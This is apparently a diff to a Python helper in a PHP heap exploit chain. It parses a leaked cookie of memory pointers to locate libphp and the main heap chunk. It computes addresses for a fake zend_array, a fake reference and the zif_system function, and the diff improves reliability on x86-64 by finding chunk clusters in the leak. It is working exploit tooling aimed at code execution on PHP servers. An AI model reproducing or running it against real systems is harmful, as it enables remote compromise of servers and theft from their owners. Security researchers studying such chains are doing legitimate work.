@@ -15,8 +15,10 @@ usage:
 """
 import argparse
 import sys
+from collections import Counter
 
-from decode_leak_cookie import DEFAULT_SYMBOLS, load_cookie, slide_pointers, summarise, to_bytes
+from decode_leak_cookie import (DEFAULT_SYMBOLS, MAX_PTR, MIN_PTR, load_cookie, slide_pointers,
+                                summarise, to_bytes)
 
 MAIN_DELTA = 0x400000   # measured: main chunk sits 4 MiB above the chunk the stale id lives in
 S_OFF = 0xF8398         # fake zend_array slot inside the main chunk (reference layout)
@@ -39,7 +41,9 @@ def main(argv=None):
     source.add_argument("--dump")
     ap.add_argument("--symbol", action="append", default=[],
                     help="name=offset inside libphp, e.g. zif_system=0x42cd70")
-    ap.add_argument("--main-delta", type=lambda x: int(x, 0), default=MAIN_DELTA)
+    ap.add_argument("--main-delta", type=lambda x: int(x, 0), default=None,
+                    help="chunk bytes between the disclosed chunk and the main chunk; default is to "
+                         "read the second chunk cluster out of the leak, which is what x86-64 needs")
     ap.add_argument("--s-off", type=lambda x: int(x, 0), default=S_OFF)
     ap.add_argument("--hsv-off", type=lambda x: int(x, 0), default=HSV_OFF)
     ap.add_argument("--min-cluster", type=int, default=16,
@@ -60,7 +64,43 @@ def main(argv=None):
     if not disclosed:
         print("incomplete: no chunk cluster", file=sys.stderr)
         return 1
-    main_chunk = disclosed + args.main_delta
+
+    # Which chunk is "main"? On arm64 it sat 4 MiB above the disclosed chunk and that held 3/3, so a
+    # constant was good enough. On x86-64 the distance came back as 0x200000, 0x600000 and 0x800000 in
+    # three fresh containers, and a fixed delta scored 1/3. The window always carries a second cluster of
+    # chunk pointers - 454 of them - and that cluster *is* the main chunk, so it is read out of the leak
+    # instead of being assumed.
+    main_chunk = disclosed + args.main_delta if args.main_delta is not None else 0
+    main_source = ("= disclosed + %#x (fixed delta)" % args.main_delta
+                   if args.main_delta is not None else "")
+    if not main_chunk:
+        # `other_bases` cannot be used here: slide_pointers() steps one byte at a time, so each real
+        # pointer contributes eight overlapping windows and the list fills with bases like 0x0 and
+        # 0x100000000. Chunk clusters have to be counted on aligned qwords.
+        aligned = [int.from_bytes(blob[i:i + 8], "little") for i in range(0, len(blob) - 7, 8)]
+        aligned = [q for q in aligned if MIN_PTR <= q < MAX_PTR]
+        clusters = Counter(q & ~0x1FFFFF for q in aligned)
+        libphp_chunk = libphp & ~0x1FFFFF
+        candidates = []
+        for base, count in clusters.items():
+            if base == disclosed:
+                continue
+            # Pointers into the module bucket into 2 MiB blocks a little above its base (base + symbol
+            # offset crosses the boundary), so excluding "libphp & ~mask" is not enough - the whole
+            # module range has to go.
+            if libphp_chunk <= base < libphp_chunk + (32 << 20):
+                continue
+            # A real neighbouring chunk of this heap is 2 MiB aligned and within a few dozen MiB of the
+            # disclosed one; the small integers that survive a naive pointer test are not.
+            if base & 0x1FFFFF or abs(base - disclosed) > (64 << 20):
+                continue
+            candidates.append((count, base))
+        if not candidates:
+            print("incomplete: no second chunk cluster; pass --main-delta explicitly", file=sys.stderr)
+            return 1
+        count, main_chunk = max(candidates)
+        main_source = "= second chunk cluster in the leak (%d pointers, %+#x from disclosed)" % (
+            count, main_chunk - disclosed)
 
     values = {
         "LIBPHP": libphp,
@@ -83,8 +123,7 @@ def main(argv=None):
           % (disclosed, result["chunk_base_votes"], round(100 * result["chunk_base_share"])))
     print("libphp        : %#x   (%d pointers in the fingerprint cluster)"
           % (libphp, result["libphp_weight"]))
-    print("main chunk    : %#x   (= disclosed + %#x, measured relation)"
-          % (main_chunk, args.main_delta))
+    print("main chunk    : %#x   (%s)" % (main_chunk, main_source))
     print("S  (fake ht)  : %#x   (main + %#x)" % (values["S"], args.s_off))
     print("hsv (fake ref): %#x   (main + %#x)" % (values["HSV"], args.hsv_off))
     for name in ("ZIF_SYSTEM", "ZEND_HASH_DESTROY"):
